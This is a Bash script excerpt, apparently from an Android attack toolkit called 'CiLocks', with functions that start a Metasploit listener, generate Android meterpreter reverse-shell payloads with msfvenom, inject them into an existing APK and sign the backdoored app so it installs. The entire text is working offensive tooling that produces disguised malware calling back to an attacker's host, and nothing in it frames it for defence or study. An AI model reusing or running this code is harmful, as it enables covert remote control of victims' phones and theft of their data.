start_msf_listener() {
    local payload="$1"
    local lhost="$2"
    local lport="$3"
    local mode="${4:-background}"

    local rc_file="${RESOURCES_DIR}/listener_${lport}.rc"

    cat > "${rc_file}" << EOF
use exploit/multi/handler
set PAYLOAD ${payload}
set LHOST ${lhost}
set LPORT ${lport}
set ExitOnSession false
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
EOF

    if [[ "${mode}" == "persistent" ]]; then
        echo "set AutoRunScript post/multi/gather/checkvm" >> "${rc_file}"
    fi

    if [[ "${mode}" == "foreground" ]]; then
        echo "exploit" >> "${rc_file}"
        log_info "Starting Metasploit listener (foreground mode)..."
        msfconsole -q -r "${rc_file}"
    else
        echo "exploit -j -z" >> "${rc_file}"
        log_info "Starting Metasploit listener (background mode)..."
        msfconsole -q -r "${rc_file}" &
        sleep 3
        log_success "Listener started on ${lhost}:${lport} (job backgrounded)"
        log_info "Manage sessions: msfconsole -q -x 'sessions -l'"
        log_info "Resource file: ${rc_file}"
    fi
}

generate_payload() {
    local payload_type="$1"
    local lhost="$2"
    local lport="$3"
    local output_name="$4"
    local original_apk="${5:-}"

    local payload
    case "${payload_type}" in
        1) payload="android/meterpreter/reverse_tcp" ;;
        2) payload="android/meterpreter/reverse_https" ;;
        3) payload="android/shell/reverse_tcp" ;;
        4) read -p "Enter custom payload: " payload ;;
        *) payload="android/meterpreter/reverse_tcp" ;;
    esac

    if [[ -n "${original_apk}" ]]; then
        log_info "Injecting payload into ${original_apk}..."
        msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" \
                 AndroidWakelock=true -x "${original_apk}" \
                 -o "${BACKDOOR_DIR}/${output_name}" &>/dev/null
    else
        log_info "Generating payload ${payload}..."
        msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" \
                 AndroidWakelock=true \
                 -o "${BACKDOOR_DIR}/${output_name}" &>/dev/null
    fi

    if [[ $? -eq 0 ]]; then
        log_success "Payload created: ${BACKDOOR_DIR}/${output_name}"
        return 0
    else
        log_error "Failed to create payload"
        return 1
    fi
}

sign_apk() {
    local apk_path="$1"
    local keystore="${BACKDOOR_DIR}/cilocks.keystore"

    log_info "Signing APK..."

    # Generate keystore if it doesn't exist
    if [[ ! -f "${keystore}" ]]; then
        keytool -genkey -V -keystore "${keystore}" \
                -alias cilocks -keyalg RSA -keysize 2048 \
                -validity 36500 -storepass cilocks -keypass cilocks \
                -dname "CN=CiLocks, O=CiLocks, C=ID" &>/dev/null
    fi

    # Sign using apksigner (preferred) or jarsigner
    if command -v apksigner &>/dev/null; then
        apksigner sign --ks "${keystore}" --ks-pass pass:cilocks \
                      --ks-key-alias cilocks \
                      --out "${apk_path}.signed" "${apk_path}" &>/dev/null
        mv "${apk_path}.signed" "${apk_path}"
    else
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
                 -keystore "${keystore}" "${apk_path}" cilocks &>/dev/null
    fi

    # Align APK
    if command -v zipalign &>/dev/null; then
        zipalign -v 4 "${apk_path}" "${apk_path}.aligned" &>/dev/null
        mv "${apk_path}.aligned" "${apk_path}"
    fi

    log_success "APK signed successfully: ${apk_path}"
}

#===============================================================================
